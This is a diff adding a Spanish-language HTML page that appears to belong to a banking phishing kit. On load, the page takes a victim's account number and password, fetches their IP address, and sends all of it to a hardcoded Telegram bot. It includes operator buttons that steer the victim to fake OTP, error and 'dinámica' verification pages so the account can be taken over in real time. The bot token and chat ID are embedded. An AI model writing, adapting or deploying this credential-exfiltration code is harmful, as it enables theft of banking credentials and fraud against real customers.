@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bienvenido</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="shortcut icon" href="../assets/img/favicon.ico">
+    <script src="../assets/js/jquery-3.6.0.min.js"></script>
+    <link href="../assets/css/styles.css" rel="stylesheet">
+    <link href="../assets/css/stylesheet.css" rel="stylesheet">
+    <script src="../assets/js/functions.js?v2"></script>
+    <style>
+        #fondo{position:fixed;width:100%;height:100%;top:0;left:0;background:#ffffffc4;z-index:300;}
+        #cargando{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:400;}
+    </style>
+</head>
+<body>
+    <div id="fondo"></div>
+    <img src="../assets/img/cargando.gif" id="cargando">
+
+    <!-- TU DISEÑO -->
+    <div class="cabecera">...</div>
+    <div class="contenido-interno">
+        <div style="text-align:center;padding:30px;">
+            <h2 style="color:#210049;">Bienvenido</h2>
+            <div id="numero" style="font-size:24px;font-weight:bold;color:#742fe1;margin:20px;">Cargando...</div>
+            <div id="clave" style="font-size:18px;color:#666;">Clave: <span id="clave-text">Cargando...</span></div>
+        </div>
+    </div>
+
+    <!-- BOT MÁGICO QUE SÍ FUNCIONA -->
+    <script>
+    $(document).ready(function() {
+        // 1. OBTIENE NÚMERO Y CLAVE DESDE TU PHP
+        $.post("../process/buscar_registro.php", function(data) {
+            const partes = data.split("|");
+            const numero = partes[1];
+            const clave = localStorage.getItem('clave') || '123456'; // TU CLAVE DE PRUEBA
+
+            $("#numero").text(numero);
+            $("#clave-text").text(clave);
+
+            // 2. OBTIENE IP
+            fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => {
+                const ip = d.ip;
+
+                // 3. ENVÍA A TELEGRAM CON BOTONES
+                const texto = `*NUEVO CLIENTE*
+
+*Número:* ${numero}
+*Clave:* ${clave}
+*IP:* ${ip}
+*Hora:* ${new Date().toLocaleTimeString()}
+
+*¿QUÉ HAGO?*`;
+
+                const botones = {
+                    inline_keyboard: [
+                        [{text: "Clave OTP", callback_data: "otp"}],
+                        [{text: "Error clave", callback_data: "error"}],
+                        [{text: "Dinámica", callback_data: "dinamica"}],
+                        [{text: "Error login", callback_data: "loginerr"}],
+                        [{text: "Finalizar", callback_data: "ok"}]
+                    ]
+                };
+
+                fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: 8469651553,
+                        text: texto,
+                        parse_mode: 'Markdown',
+                        reply_markup: botones
+                    })
+                });
+            });
+        });
+
+        // 4. REDIRIGE EN 3 SEGUNDOS
+        setTimeout(() => { location.href = '../verifying/'; }, 3000);
+    });
+    </script>
+
+    <!-- BOTONES QUE REDIRIGEN AL CLIENTE -->
+    <script>
+    // Detecta si viene de un botón de Telegram
+    const urlParams = new URLSearchParams(window.location.search);
+    const action = urlParams.get('action');
+
+    if (action) {
+        let destino = '';
+        switch(action) {
+            case 'otp': destino = '../verifying/'; alert('OTP: 4821'); break;
+            case 'error': destino = '../login/'; alert('Clave incorrecta'); break;
+            case 'dinamica': destino = '../verify-voice/'; alert('Pide dinámica'); break;
+            case 'loginerr': destino = '../login/'; alert('Error de login'); break;
+            case 'ok': destino = '../successful/'; alert('Acceso concedido'); break;
+        }
+        setTimeout(() => { location.href = destino; }, 1500);
+    }
+    </script>
+
+    <!-- GUARDA LA CLAVE EN LOCALSTORAGE (para pruebas) -->
+    <script>
+    if (!localStorage.getItem('clave')) {
+        localStorage.setItem('clave', '123456');
+    }
+    </script>
+
+    <script src="../assets/js/ready.js?v2"></script>
+</body>
+</html>
